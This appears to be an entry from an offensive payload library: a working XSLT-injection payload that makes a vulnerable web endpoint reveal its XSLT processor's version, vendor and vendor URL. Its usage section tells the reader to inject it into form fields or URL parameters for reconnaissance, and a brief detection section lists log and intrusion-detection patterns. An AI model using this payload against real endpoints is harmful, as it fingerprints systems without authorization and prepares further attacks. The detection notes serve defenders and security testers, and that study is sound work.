---
id: 1d0b8d5f-32d8-4d3f-a1d0-9dda85617e40
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:41.458442+00:00'
updated_at: '2023-04-10T20:24:48.989521+00:00'
tags:
  - xslt-injection
  - version-detection
  - vendor-enumeration
  - payload
platforms:
  - Web
validated: true
---

# XSLT-Processor-Info-Extraction-Payload

## Code

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<br />Version: <xsl:value-of select="system-property('xsl:version')" />
<br />Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br />Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
</body>
</html>
```

## Description

This XSLT payload extracts comprehensive information about the XSLT processor, including version, vendor, and vendor URL, by querying multiple `system-property()` functions. It outputs the data in a simple HTML format for easy readability in web responses. The inclusion of a PHP namespace suggests compatibility with PHP-based XSLT extensions, but it works with standard processors supporting XSLT 1.0.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `xsl:version="1.0"` | Specifies the XSLT version; adjust to 2.0 or 3.0 if targeting newer processors | `2.0` |
| `xmlns:php="http://php.net/xsl"` | Optional namespace for PHP XSLT extensions; remove if not needed for the target | N/A |

## Usage

Inject this payload into an XSLT-vulnerable endpoint, such as a form field or URL parameter that triggers XML-to-HTML transformation. The response will render as HTML with the processor details. Ideal for follow-up reconnaissance after basic vendor checks. Referenced in procedures like [[procedures/Extract-XSLT-Processor-Vendor-and-Version-via-Injection]] to gather full fingerprints for vulnerability research.

## Detection

- Log analysis for multiple `system-property` invocations in XSLT processing.
- Response body scanning for patterns like 'Version:', 'Vendor:', or unexpected URLs.
- Intrusion detection on inputs containing `<html xsl:version` or `http://php.net/xsl`.

## Related

- [[procedures/Extract-XSLT-Processor-Vendor-and-Version-via-Injection]]
